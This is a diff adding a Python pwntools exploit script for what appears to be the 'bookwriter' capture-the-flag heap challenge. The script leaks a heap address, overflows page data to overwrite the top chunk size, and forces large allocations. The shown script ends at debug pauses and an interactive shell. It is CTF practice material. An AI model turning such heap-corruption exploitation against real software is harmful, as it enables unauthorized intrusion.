@@ -1,0 +1,90 @@
+#! /usr/bin/env python
+# -*- coding: utf-8 -*-
+#
+# Copyright © 2018 hzshang <hzshang15@gmail.com>
+
+from pwn import *
+import os
+os.environ['LD_LIBRARY_PATH']="/dbg64/lib"
+context.log_level="debug"
+
+pwn_file="./bookwriter"
+libc_address=0
+heap_address=0
+libc=ELF("/dbg64/lib/libc.so.6")
+if len(sys.argv)==1:
+    conn=process(pwn_file)
+    pid=conn.pid
+else:
+    conn=remote("ww",4444)
+    #conn=remote("chall.pwnable.tw",10304)
+    pid=0
+
+def debug():
+    log.debug("libc address 0x%x"%libc_address)
+    log.debug("heap address :0x%x"%heap_address)
+    log.debug("process pid:%d"%pid)
+    pause()
+
+def login(name):
+    conn.sendafter("Author :",name)
+
+def add(size,content):
+    conn.sendlineafter("Your choice :","1")
+    conn.sendlineafter("Size of page :",str(size))
+    conn.sendafter("Content :",content)
+
+def inform(change,name=None):
+    conn.sendlineafter("Your choice :","4")
+    ret=conn.recvline(keepends=False)[len("Author : "):]
+    if change == True:
+        conn.sendlineafter("Do you want to change the author ? (yes:1 / no:0) ","1")
+        login(name)
+    else:
+        conn.sendlineafter("Do you want to change the author ? (yes:1 / no:0) ","0")
+    return ret
+
+def show(index):
+    conn.sendlineafter("Your choice :","2")
+    conn.sendlineafter("Index of page :",str(index))
+    conn.recvlines(2)
+    ret=conn.recvuntil("\n----------------------",drop=True)
+    return ret
+
+def edit(index,name):
+    conn.sendlineafter("Your choice :","3")
+    conn.sendlineafter("Index of page :",str(index))
+    conn.sendafter("Content:",name)
+
+login("a"*0x40)
+add(0x300,"a"*0x300)# 0
+heap_address=u64(inform(False)[0x40:].ljust(8,"\x00"))-0x10
+add(0x308,"a"*0x308)# 1
+edit(1,"a"*0x308)
+# f={
+#     0x200:p64(0),
+#     0x208:p64(0x101),
+#     0x210:p64(0x6020A0-0x18),
+#     0x218:p64(0x6020A0-0x10),
+#     0x300:p64(0x100),
+#     0x308:p64(0x9d1)[:3]
+# }
+edit(1,"a"*0x308+p64(0x109d1)[:3])
+add(0x15000,"a")#2
+
+edit(1,"a"*0x308+p64(0x309d1)[:3])
+
+add(0x15000,"a")#3
+add(0x108,"a"*0x108)
+edit(4,"a"*0x108)#4
+edit(4,"a"*0x108+p64(0x298b0))
+debug()
+add(0x1a000,"a")#5
+debug()
+add(0x2008,"a"*0x2008)#5
+edit(5,"a"*0x2008)
+edit(5,"a"*0x2008+p64(0xfe1)[:2])
+
+# add(0x2000,"a")#6
+debug()
+conn.interactive()
